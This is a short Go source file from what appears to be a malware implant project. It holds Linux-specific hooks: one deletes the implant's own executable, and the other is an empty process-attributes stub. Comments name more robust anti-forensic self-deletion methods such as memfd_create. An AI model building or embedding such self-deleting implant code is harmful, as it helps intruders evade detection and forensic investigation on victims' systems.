// implant/platform_linux.go
//go:build linux

package main

import (
	"os"
	"os/exec"
	// "syscall" // Not strictly needed for these simple versions
)

func init() {
	// Assign Linux-specific implementations to global function variables
	doSelfDelete = linuxDoSelfDelete
	setOSSpecificAttrs = linuxSetOSSpecificAttrs
}

func linuxDoSelfDelete(exePath string) {
	// This is a very basic self-delete attempt for Linux.
	// Robust self-deletion is complex because a running executable's file is typically locked.
	// Common techniques involve spawning a new detached process to delete the original executable
	// after the main process exits, or using memfd_create and then unlinking the original path.
	// For simplicity, this attempts a direct removal, which will likely fail if the
	// implant is currently running from this exePath.
	_ = os.Remove(exePath)
}

func linuxSetOSSpecificAttrs(cmd *exec.Cmd) {
	// On Linux, there are typically no special SysProcAttrs required for hiding windows
	// or detaching processes in the same way as on Windows for basic command execution.
	// If specific behaviors like setting process group IDs (Setpgid = true) or other
	// Linux-specific attributes were needed, they would be set here using cmd.SysProcAttr.
	// For now, this is a no-op.
	// Example:
	// cmd.SysProcAttr = &syscall.SysProcAttr{
	//    Setpgid: true,
	// }
}
